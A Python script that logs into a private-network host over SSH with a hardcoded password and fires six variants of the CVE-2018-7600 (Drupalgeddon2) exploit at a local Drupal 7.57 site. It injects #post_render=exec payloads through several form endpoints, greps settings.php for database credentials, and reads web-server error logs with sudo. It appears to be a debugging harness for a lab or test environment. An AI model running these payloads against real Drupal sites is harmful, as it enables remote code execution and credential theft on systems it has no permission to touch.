#!/usr/bin/env python3
"""Debug C7: Drupal 7.57 CVE-2018-7600"""
import paramiko
import sys
import re

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:200]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        print(f"  {out.strip()[:3000]}")
    if err.strip() and ec != 0:
        print(f"  [err] {err.strip()[:300]}")
    return out, err, ec

def sudo_cmd(ssh, cmd, timeout=30):
    full_cmd = f'sudo -S -p "" {cmd}'
    print(f">>> sudo {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(full_cmd, timeout=timeout)
    stdin.write('Gdadmin@123\n')
    stdin.flush()
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        print(f"  {out.strip()[:3000]}")
    if err.strip():
        print(f"  [stderr] {err.strip()[:300]}")
    return out, err, ec

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.101.141', username='gdadmin', password='Gdadmin@123', timeout=10)

# ============================================================
# Step 1: Basic Drupal info
# ============================================================
print("=" * 60)
print("1. DRUPAL VERSION & CONFIG")
print("=" * 60)
run(c2, "grep 'VERSION' /var/www/drupal/includes/bootstrap.inc")
run(c2, "php -v 2>&1 | head -1")
run(c2, "cat /var/www/drupal/sites/default/settings.php | grep -E 'database|username|password|host|port|base_url' | head -10")

# ============================================================
# Step 2: Check PHP settings (exec, shell_exec, etc.)
# ============================================================
print("\n" + "=" * 60)
print("2. PHP SETTINGS")
print("=" * 60)
run(c2, "php -r 'echo ini_get(\"disable_functions\") . \"\n\";'")
run(c2, "php -r 'echo function_exists(\"exec\") ? \"exec: YES\n\" : \"exec: NO\n\";'")
run(c2, "php -r 'echo function_exists(\"shell_exec\") ? \"shell_exec: YES\n\" : \"shell_exec: NO\n\";'")
run(c2, "php -r 'echo function_exists(\"system\") ? \"system: YES\n\" : \"system: NO\n\";'")

# ============================================================
# Step 3: Get form_build_id from register page
# ============================================================
print("\n" + "=" * 60)
print("3. GET FORM_BUILD_ID FROM REGISTER PAGE")
print("=" * 60)
out, _, _ = run(c2, "curl -s 'http://localhost/user/register' 2>&1")
# Extract form_build_id
form_build_id_match = re.search(r'name="form_build_id" value="([^"]+)"', out)
if form_build_id_match:
    form_build_id = form_build_id_match.group(1)
    print(f"  form_build_id: {form_build_id}")
else:
    print("  Could not find form_build_id!")
    # Try different pattern
    form_build_id_match = re.search(r'form_build_id.*?value="([^"]+)"', out)
    if form_build_id_match:
        form_build_id = form_build_id_match.group(1)
        print(f"  form_build_id (alt): {form_build_id}")
    else:
        form_build_id = "form-unknown"

# Extract form_id
form_id_match = re.search(r'name="form_id" value="([^"]+)"', out)
form_id = form_id_match.group(1) if form_id_match else "user_register_form"
print(f"  form_id: {form_id}")

# ============================================================
# Step 4: Try the CVE-2018-7600 exploit with different formats
# ============================================================
print("\n" + "=" * 60)
print("4. TRY CVE-2018-7600 EXPLOIT VARIANTS")
print("=" * 60)

# The vulnerability is in Drupal's Form API #post_render callback
# Key: The element_parents parameter needs to target a form element with #post_render
# that gets rendered via drupal_render()

# Variant 1: Classic user/register attack with mail element
print("\n--- Variant 1: Classic user/register ---")
payload_v1 = (
    f"form_id={form_id}&form_build_id={form_build_id}"
    "&name[0][#post_render][]=exec&name[0][#type]=markup&name[0][#markup]=id"
    "&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
)
run(c2, f"curl -s -X POST 'http://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' "
     f"-d '{payload_v1}' 2>&1")

# Variant 2: Use pass element
print("\n--- Variant 2: pass element ---")
payload_v2 = (
    f"form_id={form_id}&form_build_id={form_build_id}"
    "&pass[#post_render][]=exec&pass[#type]=markup&pass[#markup]=id"
)
run(c2, f"curl -s -X POST 'http://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' "
     f"-d '{payload_v2}' 2>&1")

# Variant 3: Timezone element (known working for some versions)
print("\n--- Variant 3: timezone element ---")
run(c2, f"curl -s -X POST 'http://localhost/user/register?element_parents=timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' "
     f"-d 'form_id={form_id}&form_build_id={form_build_id}"
     "&timezone[#post_render][]=exec&timezone[#type]=markup&timezone[#markup]=id' 2>&1")

# Variant 4: Different element_parents path
print("\n--- Variant 4: account/name ---")
run(c2, f"curl -s -X POST 'http://localhost/user/register?element_parents=account/name/%23value&ajax_form=1&_wrapper_format=drupal_ajax' "
     f"-d 'form_id={form_id}&form_build_id={form_build_id}"
     "&name[#post_render][]=exec&name[#type]=markup&name[#markup]=id' 2>&1")

# Variant 5: Try via /user/password endpoint
print("\n--- Variant 5: /user/password ---")
out2, _, _ = run(c2, "curl -s 'http://localhost/user/password' 2>&1")
fb_match2 = re.search(r'name="form_build_id" value="([^"]+)"', out2)
fbid2 = fb_match2.group(1) if fb_match2 else "form-unknown"
fid_match2 = re.search(r'name="form_id" value="([^"]+)"', out2)
fid2 = fid_match2.group(1) if fid_match2 else "user_pass"
print(f"  form_build_id: {fbid2}, form_id: {fid2}")

run(c2, f"curl -s -X POST 'http://localhost/user/password?element_parents=name/%23value&ajax_form=1&_wrapper_format=drupal_ajax' "
     f"-d 'form_id={fid2}&form_build_id={fbid2}"
     "&name[#post_render][]=exec&name[#type]=markup&name[#markup]=id' 2>&1")

# Variant 6: Try with system/ajax endpoint directly
print("\n--- Variant 6: Direct system/ajax ---")
run(c2, f"curl -s -X POST 'http://localhost/system/ajax' "
     f"-d 'form_id={form_id}&form_build_id={form_build_id}"
     "&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id' 2>&1")

# ============================================================
# Step 5: Check if Drupal's render system processes #post_render
# ============================================================
print("\n" + "=" * 60)
print("5. CHECK DRUPAL RENDER SYSTEM")
print("=" * 60)

# Check common.inc for drupal_render
run(c2, "grep -n 'function drupal_render' /var/www/drupal/includes/common.inc | head -5")
run(c2, "grep -n '#post_render' /var/www/drupal/includes/common.inc | head -10")

# Check if there's a specific security patch for CVE-2018-7600
run(c2, "grep -rn 'Sanitize\|sanitize\|safeString\|Xss:filter' /var/www/drupal/includes/common.inc | grep -i 'render\|callback\|post' | head -10")

# Check form.inc for the vulnerability
run(c2, "sed -n '1780,1810p' /var/www/drupal/includes/form.inc")

# ============================================================
# Step 6: Check PHP error logs during exploit attempts
# ============================================================
print("\n" + "=" * 60)
print("6. PHP ERROR LOG")
print("=" * 60)
sudo_cmd(c2, "tail -30 /var/log/apache2/error.log 2>/dev/null || tail -30 /var/log/httpd/error.log 2>/dev/null")
run(c2, "ls /var/log/apache2/ 2>/dev/null; ls /var/log/nginx/ 2>/dev/null")
sudo_cmd(c2, "tail -50 /var/log/apache2/error.log 2>/dev/null | grep -i 'exec\|post_render\|render\|error\|warning' | tail -20")

c2.close()
print("\nDone!")
